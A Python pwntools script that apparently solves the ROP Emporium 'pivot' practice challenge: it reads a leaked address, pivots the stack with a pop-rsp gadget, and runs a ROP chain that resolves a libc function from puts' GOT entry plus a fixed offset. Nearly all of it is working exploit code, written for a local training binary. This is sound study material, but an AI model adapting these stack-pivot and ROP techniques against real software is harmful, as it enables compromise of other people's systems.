from pwn import *

io = process('./pivot')
elf = ELF('./pivot')
libc = ELF('./libc.so.6')

#c
#gdb.attach(io, '''
#b *(pwnme+182)
#c
#si
#p/8x $rip
#b *(0x00000000004009c0)
#''')

io.recvuntil('pivot: ')
addr = int(io.recvline().decode(), 16)

log.info(hex(addr))
log.info(hex(elf.symbols['foothold_function']))

pivot = b''
pivot += p64(0x0000000000400a2d) # pop rsp, ..., ret
pivot += p64(addr)

log.info(hex(len(pivot)))

rop = ROP('./pivot')

p = b''
p += p64(0x00000000004009bb) # pop rax
p += p64(elf.got['puts'])
p += p64(0x00000000004009c0) # mov rax, [rax]
p += p64(0x00000000004007c8) # pop rbp ; ret
p += p64(0x625af)
p += p64(0x00000000004009c4) # add rax, rbp ; ret
p += p64(0x00000000004006b0) # call rax

io.sendline(
    b'E' * 0x18 +
    p +
    b'A' * (0x110 - len(p)) +
    pivot + 
    b'C' * (0x18 - len(pivot))
    )

io.interactive()
